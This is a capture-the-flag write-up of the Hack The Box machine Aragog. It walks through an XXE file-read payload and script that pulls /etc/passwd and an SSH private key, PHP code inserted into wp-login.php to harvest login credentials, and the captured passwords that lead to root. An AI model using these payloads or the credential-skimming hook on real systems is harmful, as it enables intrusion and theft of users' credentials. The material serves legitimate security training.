---
title: HTB: Aragog
url: https://0xdf.gitlab.io/2018/07/21/htb-aragog.html
date: 2018-07-21T18:55:42+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-aragog, hackthebox, xxe, ssh, pspy, wordpress, cron
---

Aragog provided a chance to play with XML External Entity (XXE) vulnerabilities, as well as a chance to modify a running website to capture user credentials.

## Box Info

| Name | [Aragog](https://hackthebox.com/machines/aragog)  [Aragog](https://hackthebox.com/machines/aragog) [Play on HackTheBox](https://hackthebox.com/machines/aragog) |
| --- | --- |
| Release Date | 10 Feb 2018 |
| Retire Date | 04 May 2024 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Aragog |
| Radar Graph | Radar chart for Aragog |
| First Blood User | 01:41:20[overcast overcast](https://app.hackthebox.com/users/9682) |
| First Blood Root | 03:37:16[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creator | [egre55 egre55](https://app.hackthebox.com/users/1190) |

## nmap

Initial scans show ftp, ssh, and http:

```

root@kali# nmap -sT -p- --min-rate 5000 --max-retries 1 -oA nmap/alltcp 10.10.10.78

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-21 08:17 EDT
Warning: 10.10.10.78 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.78
Host is up (0.098s latency).
Not shown: 64001 closed ports, 1531 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.93 seconds

root@kali# nmap -sU -p- --min-rate 5000 --max-retries 1 -oA nmap/alludp 10.10.10.78

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-21 08:18 EDT
Warning: 10.10.10.78 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.78
Host is up (0.10s latency).
All 65535 scanned ports on 10.10.10.78 are open|filtered (65503) or closed (32)

Nmap done: 1 IP address (1 host up) scanned in 26.73 seconds

root@kali# nmap -sV -sC -p 21,22,80 -oA nmap/initial 10.10.10.78

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-21 08:19 EDT
Nmap scan report for 10.10.10.78
Host is up (0.100s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 ftp      ftp            86 Dec 21 16:30 test.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.157
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 (RSA)
|   256 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 (ECDSA)
|_  256 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.60 seconds

```

We have anonymous login to the ftp service, and from the Apache version, looks like we’re dealing with an Ubuntu 16.04 box.

## port 21: ftp

In the open ftp, there’s a test.txt, which is an xml file.

```

root@kali# ftp 10.10.10.78
Connected to 10.10.10.78.
220 (vsFTPd 3.0.3)
Name (10.10.10.78:root): ftp
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r--r--r--    1 ftp      ftp            86 Dec 21 16:30 test.txt
226 Directory send OK.
ftp> get test.txt
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for test.txt (86 bytes).
226 Transfer complete.
86 bytes received in 0.01 secs (16.0092 kB/s)

```

`test.txt`:

```

<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>

```

## Port 80 - Web

### Site

The root on port 80 just returns the default apache page.
*[July 2023 update]*: At some point since this box originally retired, the box was reworked to have the main site redirect to `aragog.htb`. To solve the current box, I’d need to add this domain to my `hosts` file and reference the domain instead of the IP in virtually all of the commands that follow. They have not been updated here, but would need to be to solve the box today. Thanks to InvertedClimbing for the tip.

### Gobuster

```

root@kali# gobuster -u http://10.10.10.78 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.78/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
[+] Extensions   : .php,.html,.txt
=====================================================
/index.html (Status: 200)
/hosts.php (Status: 200)
=====================================================

```

### hosts.php

`gobuster` identified a `hosts.php` site. First, we should try to figure out what the over functionality is. By just visiting, it returns what looks like an incomplete message:

![1531999262200](https://0xdfimages.gitlab.io/img/1531999262200.png)

We need to figure out how to interact with it.

#### wfuzz (failure)

First, I tried to fuzz parameters for `/hosts.php`:

```

root@kali# wfuzz -c -w /opt/SecLists/Discovery/DNS/namelist.txt --hh 46 http://10.10.10.78/hosts.php?FUZZ=abc

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 2.2.9 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.78/hosts.php?FUZZ=abc
Total requests: 1907

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

Total time: 24.26966
Processed Requests: 1907
Filtered Requests: 1907
Requests/sec.: 78.57544

root@kali# wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1mil-110000.txt --hh 46 http://10.10.10.78/hosts.php?FUZZ=abc

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 2.2.9 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.78/hosts.php?FUZZ=abc
Total requests: 114532

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

Total time: 1403.956
Processed Requests: 114532
Filtered Requests: 114532
Requests/sec.: 81.57804

```

#### xml Upload

It dawned on me that the xml file could be used for this site. By posting XML in the format found in `test.txt`, we can get `hosts.php` to calculate the number of hosts in the given subnet:

```

root@kali# cat test.txt
<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
root@kali# curl -X POST -d @test.txt http://10.10.10.78/hosts.php

There are 62 possible hosts for 255.255.255.192

root@kali# cat test2.txt
<details>
    <subnet_mask>255.255.255.0</subnet_mask>
    <test></test>
</details>
root@kali# curl -X POST -d @test2.txt http://10.10.10.78/hosts.php

There are 254 possible hosts for 255.255.255.0

```

## XXE Exploit / User Shell

This page takes our xml input, and shows it back to us! We can do an inbound XXE attack to read files:

```

root@kali# cat exploit.xml
<!DOCTYPE foo[
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/lsb-release"> ]>
<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test></test>
</details>
root@kali# curl -X POST -d @exploit.xml http://10.10.10.78/hosts.php -x http://127.0.0.1:8080

There are 4294967294 possible hosts for DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.3 LTS"

```

Perfect. Write a quick bash script so were not editing files every time.

`xxe_get_file.sh`:

```

#!/bin/bash

if [ "$#" == "1" ]; then
    file=$1
else
    echo "$0 [file]"
    exit 1
fi

exploit="<!DOCTYPE foo[
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM \"$file\"> ]>
<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test></test>
</details>"

echo "$exploit" > tmp
curl -s -X POST -d @tmp http://10.10.10.78/hosts.php -x http://127.0.0.1:8080 | tee $(basename "$file")
rm tmp

```

```

root@kali# ./xxe_get_file.sh /etc/lsb-release

There are 4294967294 possible hosts for DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.3 LTS"

```

Now grab `/etc/passwd` to reveal accounts on the box:

```

news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
florian:x:1000:1000:florian,,,:/home/florian:/bin/bash
cliff:x:1001:1001::/home/cliff:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:123:130:ftp daemon,,,:/srv/ftp:/bin/false

```

And, we can get try to get ssh keys. We don’t find one for cliff:

```

root@kali# ./xxe_get_file.sh /home/cliff/.ssh/id_rsa

There are 4294967294 possible hosts for

```

But we do for florian:

```

root@kali# ./xxe_get_file.sh /home/florian/.ssh/id_rsa

There are 4294967294 possible hosts for -----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d
+YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8
lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn
1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+
Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd
d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK
AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg
TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD
9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb
/oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV
0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1
sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV
Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH
zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE
rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE
tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3
HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/
I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg
ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7
HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y
kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs
4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+
7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3
daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv
uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA==
-----END RSA PRIVATE KEY-----

```

florian’s key is enough to get a shell, and user.txt:

```

root@kali# ssh -i ~/id_florian-aragog florian@10.10.10.78
Last login: Fri May 11 04:15:31 2018 from 10.10.15.134
florian@aragog:~$ wc -c user.txt
33 user.txt
florian@aragog:~$ cat user.txt
f43bdfbc...

```

## Privesc: florian -> root

### dev\_wiki

In `/var/www/html`, along side the `hosts.php` application, there’s a `dev_wiki` folder that we had not previously identified. It looks like a WordPress site:

```

florian@aragog:/var/www/html$ ls -la
total 36
drwxrwxrwx 5 www-data www-data  4096 May 11 05:45 .
drwxr-xr-x 3 root     root      4096 Dec 18 16:36 ..
drwxrwxrwx 5 cliff    cliff     4096 May 11 05:45 dev_wiki
-rw-r--r-- 1 www-data www-data   689 Dec 21 15:31 hosts.php
-rw-r--r-- 1 www-data www-data 11321 Dec 18 16:36 index.html
drwxr-xr-x 5 florian  florian   4096 May 11 05:35 .test
drw-r--r-- 5 cliff    cliff     4096 Dec 20 16:17 zz_backup

florian@aragog:/var/www/html$ ls dev_wiki/
index.php    wp-activate.php     wp-comments-post.php  wp-cron.php        wp-load.php   wp-settings.php   xmlrpc.php
license.txt  wp-admin            wp-config.php         wp-includes        wp-login.php  wp-signup.php
readme.html  wp-blog-header.php  wp-content            wp-links-opml.php  wp-mail.php   wp-trackback.php

```

There’s a redirect that requires that we add aragog to our /etc/hosts file, and then we get the page:

![1526042880502](https://0xdfimages.gitlab.io/img/1526042880502.png)

The page is super sparse, but there is one entry under blog:

![1526042911770](https://0xdfimages.gitlab.io/img/1526042911770.png)

That probably explains the `zz_backup` directory next to the `dev_wiki` directory.

#### Fail - Get Creds from MySql Database

Because it’s a WordPress site, we know where to find db creds:

```

florian@aragog:/var/www/html/dev_wiki$ cat wp-config.php | grep -A17 "MySQL settings - "
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wp_wiki');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', '$@y6CHJ^$#5c37j$#6h');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

```

Now use them to check out the db:

```

florian@aragog:/var/www/html/dev_wiki$ mysql -u root -p'$@y6CHJ^$#5c37j$#6h'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 148
Server version: 5.7.20-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wp_wiki            |
+--------------------+
5 rows in set (0.00 sec)

mysql> use wp_wiki
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wp_wiki     |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> select * from wp_users;
+----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+
| ID | user_login    | user_pass                          | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name  |
+----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+
|  1 | Administrator | $P$B3FUuIdSDW0IaIc4vsjj.NzJDkiscu. | administrator | it@megacorp.com |          | 2017-12-20 23:26:04 |                     |           0 | Administrator |
+----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+
1 row in set (0.00 sec)

```

Unfortunately, rockyou doesn’t crack the hash:

```

root@kali# hashcat -m400 wp.hash /usr/share/wordlists/rockyou.txt
hashcat (v4.1.0) starting...
* Device #1: Not a native Intel OpenCL runtime. Expect massive speed loss.
             You can use --force to override, but do not report related errors.
No devices found/left.

Started: Fri May 11 08:56:25 2018
Stopped: Fri May 11 08:56:25 2018
root@kali# hashcat -m400 wp.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v4.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-7700 CPU @ 3.60GHz, 1024/2961 MB allocatable, 4MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
...

```

#### Wiki Backup

The note on the wp site says that there’s a frequent backup process. I wasn’t able to find the backup process on my own, but I found a tool which is pretty awesome.

#### pspy

Find it here: <https://github.com/DominicBreuker/pspy>

##### Installation
1. `git clone` into directory
2. start docker daemon in another window: `dockerd`
3. `make build-build-image`
4. `make build`

The result should be a `bin` directory with 4 exes, static and compressed for 32 and 64-bit.

##### Run on Aragog

On run, it prints all the current processes, and then new ones. This group of processes comes every minute:

```

florian@aragog:/dev/shm/.pspy$ ./pspy32
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watc
hing directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
...
2018/05/11 14:31:01 CMD: UID=1001 PID=5337   | /bin/sh -c /usr/bin/python /home/cliff/wp-login.py
2018/05/11 14:31:01 CMD: UID=1001 PID=5336   | /bin/sh -c /usr/bin/python /home/cliff/wp-login.py
2018/05/11 14:31:01 CMD: UID=0    PID=5335   | /usr/sbin/CRON -f
2018/05/11 14:31:01 CMD: UID=1001 PID=5338   | /usr/bin/python /home/cliff/wp-login.py
2018/05/11 14:31:01 CMD: UID=1001 PID=5339   |
2018/05/11 14:31:01 CMD: UID=1001 PID=5340   | /usr/bin/python /home/cliff/wp-login.py
2018/05/11 14:31:01 CMD: UID=1001 PID=5341   |

```

Every 5 minutes, there’s some additional processes:

```

2018/05/12 11:15:01 CMD: UID=0    PID=3263   | /usr/sbin/CRON -f
2018/05/12 11:15:01 CMD: UID=0    PID=3262   | /usr/sbin/CRON -f
2018/05/12 11:15:01 CMD: UID=0    PID=3266   | /bin/bash /root/restore.sh
2018/05/12 11:15:01 CMD: UID=0    PID=3265   | /usr/sbin/CRON -f
2018/05/12 11:15:01 CMD: UID=0    PID=3264   | /bin/sh -c /bin/bash /root/restore.sh
2018/05/12 11:15:01 CMD: UID=0    PID=3267   | rm -rf /var/www/html/dev_wiki/
2018/05/12 11:15:01 CMD: UID=1001 PID=3268   | /usr/bin/python /home/cliff/wp-login.py
2018/05/12 11:15:02 CMD: UID=0    PID=3269   | cp -R /var/www/html/zz_backup/ /var/www/html/dev_wiki/
2018/05/12 11:15:02 CMD: UID=1001 PID=3271   | /sbin/ldconfig.real -p
2018/05/12 11:15:02 CMD: UID=1001 PID=3270   | sh -c LC_ALL=C LANG=C /sbin/ldconfig -p 2>/dev/null
2018/05/12 11:15:02 CMD: UID=1001 PID=3272   | sh -c uname -p 2> /dev/null
2018/05/12 11:15:02 CMD: UID=1001 PID=3273   | uname -p
2018/05/12 11:15:02 CMD: UID=0    PID=3274   | chown -R cliff:cliff /var/www/html/dev_wiki/
2018/05/12 11:15:02 CMD: UID=0    PID=3275   | chmod -R 777 /var/www/html/dev_wiki/

```

Two interesting bits from the output of pspy:
1. The group of processes that starts every five minutes gives a pretty good idea of what happens when `/root/restore.sh` is called, which seems to be reverting the `dev_wiki` site.
2. `wp-login.py` called by cliff (user UID=1001) is certainly interesting and worth further investigation.

#### Capturing Credentials

##### Failed - tcpdump

The names of the recurring script is `wp-login.py`, which suggests it logs into the site. Let’s try to capture that with `tcpdump`, and get the creds:

```

florian@aragog:/dev/shm$ tcpdump -D
1.ens33 [Up, Running]
2.any (Pseudo-device that captures on all interfaces) [Up, Running]
3.lo [Up, Running, Loopback]
4.nflog (Linux netfilter log (NFLOG) interface)
5.nfqueue (Linux netfilter queue (NFQUEUE) interface)
6.usbmon1 (USB bus number 1)
7.usbmon2 (USB bus number 2)
florian@aragog:/dev/shm$ tcpdump -i 3
tcpdump: lo: You don't have permission to capture on that device
(socket: Operation not permitted)

```

Unfortunately, we don’t have permissions to do it.

##### Modify wp-login.php

Since the login is a post to `wp-login.php`, I will modify that page so that it dumps any credentials submitted to it to file, by adding the lines under `<?php`:

```

<?php
$rrr = print_r($_REQUEST, true);
$fff = fopen("/dev/shm/df", "a");
fwrite($fff, $rrr);
fclose($fff);

```

Then, I can test by trying to log in, and seeing my response:

```

florian@aragog:/dev/shm$ cat df
Array
(
    [log] => administrator
    [pwd] => sdf
    [wp-submit] => Log In
    [redirect_to] => http://aragog/dev_wiki/wp-admin/
    [testcookie] => 1
)

```

Now wait until the minute rolls around…

```

florian@aragog:/dev/shm$ cat df
Array
(
    [log] => administrator
    [pwd] => sdf
    [wp-submit] => Log In
    [redirect_to] => http://aragog/dev_wiki/wp-admin/
    [testcookie] => 1
)
Array
(
    [pwd] => !KRgYs(JFO!&MTr)lf
    [wp-submit] => Log In
    [testcookie] => 1
    [log] => Administrator
    [redirect_to] => http://127.0.0.1/dev_wiki/wp-admin/
)

```

## root Shell

With cliff’s creds, try to su as him:

```

florian@aragog:/var/www/html/dev_wiki$ su cliff
Password:
su: Authentication failure

```

What about root?

```

florian@aragog:/var/www/html/dev_wiki$ su
Password:
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
sh: 0: getcwd() failed: No such file or directory
root@aragog:/var/www/html/dev_wiki# cd /home/cliff
chdir: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
root@aragog:/home/cliff#

```

Nice!

```

root@aragog:~# ls
restore.sh  root.txt
root@aragog:~# wc -c root.txt
33 root.txt
root@aragog:~# cat root.txt
9a9da52d...

```

## Other Details

### hosts.php

The `hosts.php` file that allowed for initial access:

```

florian@aragog:/home$ cat /var/www/html/hosts.php
<?php

    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $details = simplexml_import_dom($dom);
    $mask = $details->subnet_mask;
    //echo "\r\nYou have provided subnet $mask\r\n";

    $max_bits = '32';
    $cidr = mask2cidr($mask);
    $bits = $max_bits - $cidr;
    $hosts = pow(2,$bits);
    echo "\r\nThere are " . ($hosts - 2) . " possible hosts for $mask\r\n\r\n";

    function mask2cidr($mask){
         $long = ip2long($mask);
         $base = ip2long('255.255.255.255');
         return 32-log(($long ^ $base)+1,2);
    }

?>

```

### wp-login.py

With root shell, can grab the `wp-login.py` script, which does exactly what we expected:

```

root@aragog:/home/cliff# ls
examples.desktop  wp-login.py

root@aragog:/home/cliff# cat wp-login.py
import requests

wp_login = 'http://127.0.0.1/dev_wiki/wp-login.php'
wp_admin = 'http://127.0.0.1/dev_wiki/wp-admin/'
username = 'Administrator'
password = '!KRgYs(JFO!&MTr)lf'

with requests.Session() as s:
    headers1 = { 'Cookie':'wordpress_test_cookie=WP Cookie check' }
    datas={
        'log':username, 'pwd':password, 'wp-submit':'Log In',
        'redirect_to':wp_admin, 'testcookie':'1'
    }
    s.post(wp_login, headers=headers1, data=datas)
    resp = s.get(wp_admin)
    print(resp.text)

```

### restore.sh

In root, there’s a script `restore.sh`. It basically sets the site back to where it started, and runs every 5 minutes, which is good in world where people are going to be messing with the live site:

```

root@aragog:~# cat restore.sh
rm -rf /var/www/html/dev_wiki/
cp -R /var/www/html/zz_backup/ /var/www/html/dev_wiki/
chown -R cliff:cliff /var/www/html/dev_wiki/
chmod -R 777 /var/www/html/dev_wiki/

root@aragog:~# crontab -l | grep -v \#
*/5 * * * * /bin/bash /root/restore.sh

```